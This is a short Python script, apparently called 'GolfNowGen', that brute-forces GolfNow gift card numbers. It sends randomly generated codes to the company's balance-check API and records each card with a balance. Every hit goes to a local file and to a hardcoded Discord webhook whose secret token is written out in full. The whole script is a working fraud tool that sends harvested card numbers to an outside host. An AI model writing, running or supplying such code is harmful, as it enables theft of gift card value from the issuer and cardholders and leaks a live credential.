#FIXED BY SQUEAL
import requests
import os
import random
from colorama import init, Fore, Back, Style
from discord_webhook import DiscordWebhook, DiscordEmbed 

fail = 1

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT

os.system("cls")

print("GolfNowGen\nCoded By Dems! AND FIXED BY SQUEAL\n")
times = int(input("How many codes to check [1-999999999]: "))

api = "https://giftcard.golfnow.com/api/checkBalance?number="
base = "6275717343"

ROOT_PATH = os.path.dirname(os.path.abspath(__file__))
valid = os.path.join(ROOT_PATH, "valid.txt")

os.system("cls")

for i in range(times):
    other = str(random.randint(111111,999999))
    code = api+base+other

    r = requests.get(code)

    try:
        json = r.json()
        balance = json["balance"]
        print(green+base+other,"| Balance: $"+balance)
        printing = base+other+" | Balance: $"+balance
        webhooklist = ['https://discord.com/api/webhooks/794485248570032139/Uo-O6NAHKyBfPUWXL0EJSIEq6wak4ecg3VVVdmE4mcFDv5onNPrk-Bj_SWXS7xzaGypX']
        webhook_pick = random.choice(webhooklist)
        webhook = DiscordWebhook(url=webhook_pick)
        embed = DiscordEmbed(description=f'{printing}', color=11111111)
        webhook.add_embed(embed)
        wresponse = webhook.execute()
        with open(valid, 'a') as file:
            file.write(printing+"\n")
    except ValueError:
        fail =+ 1        